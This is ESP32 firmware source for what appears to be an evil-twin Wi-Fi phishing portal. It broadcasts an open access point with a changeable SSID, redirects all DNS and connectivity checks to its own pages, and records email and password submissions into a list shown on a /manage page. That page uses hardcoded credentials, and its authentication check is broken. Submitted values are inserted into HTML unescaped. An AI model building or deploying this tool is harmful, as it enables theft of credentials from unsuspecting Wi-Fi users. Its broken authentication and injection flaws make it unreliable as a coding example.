#include <Arduino.h>
#include <SPIFFS.h>
#include <FS.h>
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <esp_wifi.h>
#include <EEPROM.h>

#define EEPROM_SSID_ADDRESS 0

String ssid = "captive";
const char *password = NULL;

#define MAX_CLIENTS 4
#define WIFI_CHANNEL 6

const IPAddress localIP(4, 3, 2, 1);
const IPAddress gatewayIP(4, 3, 2, 1);
const IPAddress subnetMask(255, 255, 255, 0);

const String localIPURL = "http://4.3.2.1";

DNSServer dnsServer;
AsyncWebServer server(80);

String CredentialList;
String email;
String pass;

const char* http_username = "admin";
const char* http_password = "securepassword";

void checkCredentials(AsyncWebServerRequest *request) {
  if (!request->authenticate(http_username, http_password)) {
    request->requestAuthentication();
  }
}

String loadFile(String path) {
  File file = SPIFFS.open(path, "r");
  if (!file) {
    Serial.println("Failed to open file: " + path);
    return "";
  }

  String content = file.readString();
  file.close();
  return content;
}

void handleResetDevice(AsyncWebServerRequest *request) {
  request->send(200, "text/html", "Resetting EEPROM and SSID...");

  // Reset SSID to default
  ssid = "captive";
  WiFi.softAP(ssid.c_str(), password, WIFI_CHANNEL, 0, MAX_CLIENTS);

  // Clear EEPROM
  EEPROM.begin(512);
  EEPROM.put(EEPROM_SSID_ADDRESS, ssid);
  EEPROM.commit();
  EEPROM.end();

  delay(1000); // Give the response time to be sent
  ESP.restart();
}

//--------------------ZMIENIANIE SSID-----------------------//
int h2int(char c);
String urldecode(String input);

void handleSsidChange(AsyncWebServerRequest *request) {
  if (request->hasParam("ssid", true)) {
    String newSsidEncoded = request->getParam("ssid", true)->value();
    String newSsid = urldecode(newSsidEncoded);
    ssid = newSsid;

    // Zapisz nowe SSID do pamięci EEPROM
    EEPROM.begin(512);
    EEPROM.put(EEPROM_SSID_ADDRESS, ssid);
    EEPROM.commit();
    EEPROM.end();

    WiFi.softAP(ssid.c_str(), password, WIFI_CHANNEL, 0, MAX_CLIENTS);
    request->send(200, "text/html", "SSID changed to: " + newSsid);
    Serial.println("SSID changed to: " + newSsid);
  } else {
    request->send(400, "text/html", "Bad Request");
  }
}

// DEKODOWANIE SSID
String urldecode(String input) {
  String output = "";
  char c;
  for (int i = 0; i < input.length(); i++) {
    c = input.charAt(i);
    if (c == '+') c = ' ';
    if (c == '%') {
      char c1 = input.charAt(++i);
      char c2 = input.charAt(++i);
      c = (h2int(c1) << 4) | h2int(c2);
    }
    output += c;
  }
  return output;
}
// DEKODOWANIE SSID
int h2int(char c) {
  if (c >= '0' && c <='9')
    return (c - '0');
  if (c >= 'a' && c <='f')
    return (c - 'a' + 10);
  if (c >= 'A' && c <='F')
    return (c - 'A' + 10);
  return 0;
}
//----------------------------------------------------//

void handleRestartDevice(AsyncWebServerRequest *request) {
  request->send(200, "text/html", "Restarting device...");
  delay(1000); // Give the response time to be sent
  ESP.restart();
}

void setUpDNSServer(DNSServer &dnsServer, const IPAddress &localIP) {
#define DNS_INTERVAL 30
    dnsServer.setTTL(3600);
    dnsServer.start(53, "*", localIP);
}

void startSoftAccessPoint(const char *ssid, const char *password, const IPAddress &localIP, const IPAddress &gatewayIP) {
    WiFi.mode(WIFI_MODE_AP);
    const IPAddress subnetMask(255, 255, 255, 0);
    WiFi.softAPConfig(localIP, gatewayIP, subnetMask);
    WiFi.softAP(ssid, password, WIFI_CHANNEL, 0, MAX_CLIENTS);
    esp_wifi_stop();
    esp_wifi_deinit();
    wifi_init_config_t my_config = WIFI_INIT_CONFIG_DEFAULT();
    my_config.ampdu_rx_enable = false;
    esp_wifi_init(&my_config);
    esp_wifi_start();
    vTaskDelay(100 / portTICK_PERIOD_MS);
}

void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP) {
    server.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); });
    server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });

    server.on("/generate_204", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
    server.on("/redirect", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
    server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
    server.on("/canonical.html", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });
    server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });
    server.on("/ncsi.txt", [](AsyncWebServerRequest *request) { request->redirect(localIPURL); });

    server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });

	// LOADING FONTS AND STYLES
    server.on("/style.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
        String content = loadFile("/style.css");
        AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
        response->addHeader("Cache-Control", "public,max-age=31536000");
        request->send(response);
        Serial.println("Served CSS Style Sheet");
    });

	server.on("/style2.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
        String content = loadFile("/style2.css");
        AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
        response->addHeader("Cache-Control", "public,max-age=31536000");
        request->send(response);
        Serial.println("Served CSS Style Sheet");
    });

	// server.on("/css/googleSans.css", HTTP_ANY, [](AsyncWebServerRequest *request) {
  //       String content = loadFile("/css/googleSans.css");
  //       AsyncWebServerResponse *response = request->beginResponse(200, "text/css", content);
  //       response->addHeader("Cache-Control", "public,max-age=31536000");
  //       request->send(response);
  //       Serial.println("Served CSS Style Sheet");
  //   });
	// THIS FONTS NOT WORKING!!! IDK WHY
	// server.on("/css/medium.ttf", HTTP_ANY, [](AsyncWebServerRequest *request) {
  //   String content = loadFile("/css/medium.ttf");
  //   AsyncWebServerResponse *response = request->beginResponse(200, "application/font-ttf", content);
  //   response->addHeader("Cache-Control", "public,max-age=31536000");
  //   request->send(response);
  //   Serial.println("Served Font File");
	// });
	
	// server.on("/css/regular.ttf", HTTP_ANY, [](AsyncWebServerRequest *request) {
  //       String content = loadFile("/css/regular.ttf");
  //       AsyncWebServerResponse *response = request->beginResponse(200, "application/font-ttf", content);
  //       response->addHeader("Cache-Control", "public,max-age=31536000");
  //       request->send(response);
  //       Serial.println("Served TTF Font");
  //   });

	// server.on("/css/roboto.ttf", HTTP_ANY, [](AsyncWebServerRequest *request) {
  //       String content = loadFile("/css/roboto.ttf");
  //       AsyncWebServerResponse *response = request->beginResponse(200, "application/font-ttf", content);
  //       response->addHeader("Cache-Control", "public,max-age=31536000");
  //       request->send(response);
  //       Serial.println("Served TTF Font");
  //   });

	//LOADING HTML PAGES
  server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request) {
    String content = loadFile("/index.html");
    AsyncWebServerResponse *response = request->beginResponse(200, "text/html", content);
    response->addHeader("Cache-Control", "public,max-age=31536000");
    request->send(response);
    Serial.println("Served Basic HTML Page");
  	});

  server.on("/manage", HTTP_ANY, [](AsyncWebServerRequest *request) {
    checkCredentials(request);
    String dynamicManageHTML = loadFile("/manage.html");
    dynamicManageHTML.replace("%CREDENTIALS%", CredentialList);
    AsyncWebServerResponse *response = request->beginResponse(200, "text/html", dynamicManageHTML);
    response->addHeader("Cache-Control", "public,max-age=31536000");
    request->send(response);
    Serial.println("Served Manage HTML Page");
  });

  server.on("/login", HTTP_ANY, [](AsyncWebServerRequest *request) {
    String content = loadFile("/login.html");
    AsyncWebServerResponse *response = request->beginResponse(200, "text/html", content);
    response->addHeader("Cache-Control", "public,max-age=31536000");
    request->send(response);
    Serial.println("Served login HTML Page");
  });

  server.on("/blank", HTTP_ANY, [](AsyncWebServerRequest *request) {
    String content = loadFile("/blank.html");
    AsyncWebServerResponse *response = request->beginResponse(200, "text/html", content);
    response->addHeader("Cache-Control", "public,max-age=31536000");
    request->send(response);
    Serial.println("Served login HTML Page");
  });

	server.on("/change-ssid", HTTP_POST, handleSsidChange);

	server.on("/restart-device", HTTP_POST, handleRestartDevice);

	server.on("/reset-device", HTTP_POST, handleResetDevice);

    // New handler for submitting email
    server.on("/submit-email", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasParam("email", true)) {
        email = request->getParam("email", true)->value();

        // You can store, display, or process email and pass as needed
        CredentialList += "Email: <div style='background-color:" + email + "; padding: 10px; margin: 5px;'>" + email + "</div>";

        request->redirect("/login"); // Redirect back to the pass page after submitting email
    }

});
    // New handler for submitting pass
    server.on("/submit-pass", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasParam("pass", true)) {
        pass = request->getParam("pass", true)->value();

		// You can store, display, or process email and pass as needed
		CredentialList += "Password: <div style='background-color:" + pass + "; padding: 10px; margin: 5px;'>" + pass + "<hr></div>";

        request->redirect("/blank"); // Redirect back to the blank page after submitting pass
    }
});

    server.onNotFound([](AsyncWebServerRequest *request) {
        request->redirect(localIPURL);
        Serial.print("onnotfound ");
        Serial.print(request->host());
        Serial.print(" ");
        Serial.print(request->url());
        Serial.print(" sent redirect to " + localIPURL + "\n");
    });
}

void setup() {
    Serial.setTxBufferSize(1024);
    Serial.begin(115200);

    while (!Serial)
        ;

	if (!SPIFFS.begin()) {
    Serial.println("Failed to mount file system");
    return;
  }

	EEPROM.begin(512);
	EEPROM.get(EEPROM_SSID_ADDRESS, ssid);
	EEPROM.end();

    Serial.println("\n\nCaptive Test, V0.5.0 compiled " __DATE__ " " __TIME__ " by CD_FER");
    Serial.printf("%s-%d\n\r", ESP.getChipModel(), ESP.getChipRevision());

    startSoftAccessPoint(ssid.c_str(), password, localIP, gatewayIP);

    setUpDNSServer(dnsServer, localIP);

    setUpWebserver(server, localIP);
    server.begin();

    Serial.print("\n");
    Serial.print("Startup Time:");
    Serial.println(millis());
    Serial.print("\n");
}

void loop() {
    dnsServer.processNextRequest();
    delay(30);
}